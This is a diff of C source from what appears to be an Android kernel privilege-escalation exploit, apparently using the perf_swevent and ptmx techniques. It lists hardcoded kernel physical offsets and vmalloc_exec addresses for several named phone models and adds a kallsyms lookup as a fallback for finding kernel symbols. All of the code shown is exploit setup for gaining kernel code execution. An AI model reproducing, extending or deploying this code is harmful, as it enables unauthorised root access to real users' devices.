@@ -2,10 +2,11 @@
 #include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <strings.h>
 #include <fcntl.h>
 #define _LARGEFILE64_SOURCE
-#include <sys/system_properties.h>
 
+#include "detect_device.h"
 #include "perf_swevent.h"
 #include "ptmx.h"
 #include "mm.h"
@@ -21,51 +22,51 @@
 #define sizeof_do_mmap()  sizeof (do_mmap)
 
 typedef struct _supported_device {
-  const char *device;
-  const char *build_id;
+  int device_id;
   unsigned long int kernel_phys_offset;
   unsigned long int vmalloc_exec_address;
 } supported_device;
 
 static supported_device supported_devices[] = {
-  { "IS17SH", "01.00.04",    0x00208000, 0xc0212b70 },
-  { "SH-04E", "01.00.02",    0x80208000, 0xc00f10d4 },  // not tested yet
-  { "SOL21",  "9.1.D.0.395", 0x80208000, 0xc011aeec },
-  { "HTL21",  "JRO03C",      0x80608000, 0xc010b728 },
-  { "ISW13F", "V69R51I",     0x10008000, 0xc01294b0 },  // not tested yet
+  { DEV_IS17SH_01_00_04,    0x00208000, 0xc0212b70 },
+  { DEV_SH04E_01_00_02,     0x80208000, 0xc00f10d4 },
+  { DEV_SOL21_9_1_D_0_395,  0x80208000, 0xc011aeec },
+  { DEV_HTL21_JRO03C,       0x80608000, 0xc010b728 },
+  { DEV_ISW13F_V69R51I,     0x80008000, 0xc01294b0 },  // not tested yet
 };
 
 static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
 
 static unsigned long int kernel_phys_offset;
 static void *(*vmalloc_exec)(unsigned long size);
+static int (*remap_pfn_range)(struct vm_area_struct *, unsigned long addr,
+                              unsigned long pfn, unsigned long size, pgprot_t);
 
 static bool
 setup_variables(void)
 {
+  int device_id = detect_device();
   int i;
-  char device[PROP_VALUE_MAX];
-  char build_id[PROP_VALUE_MAX];
 
-  __system_property_get("ro.product.model", device);
-  __system_property_get("ro.build.display.id", build_id);
+  kernel_phys_offset = 0;
+  vmalloc_exec = 0;
 
   for (i = 0; i < n_supported_devices; i++) {
-    if (!strcmp(device, supported_devices[i].device) &&
-        !strcmp(build_id, supported_devices[i].build_id)) {
+    if (supported_devices[i].device_id == device_id) {
       kernel_phys_offset = supported_devices[i].kernel_phys_offset;
       vmalloc_exec = (void *)supported_devices[i].vmalloc_exec_address;
-
-      if (!vmalloc_exec && kallsyms_exist()) {
-        vmalloc_exec = (void *)kallsyms_get_symbol_address("vmalloc_exec");
-      }
-
-      return kernel_phys_offset && vmalloc_exec;
     }
   }
 
-  printf("%s (%s) is not supported.\n", device, build_id);
+  if (!vmalloc_exec) {
+    vmalloc_exec = (void *)kallsyms_get_symbol_address("vmalloc_exec");
+  }
 
+  if (kernel_phys_offset && vmalloc_exec) {
+    return true;
+  }
+
+  print_reason_device_not_supported();
   return false;
 }
 
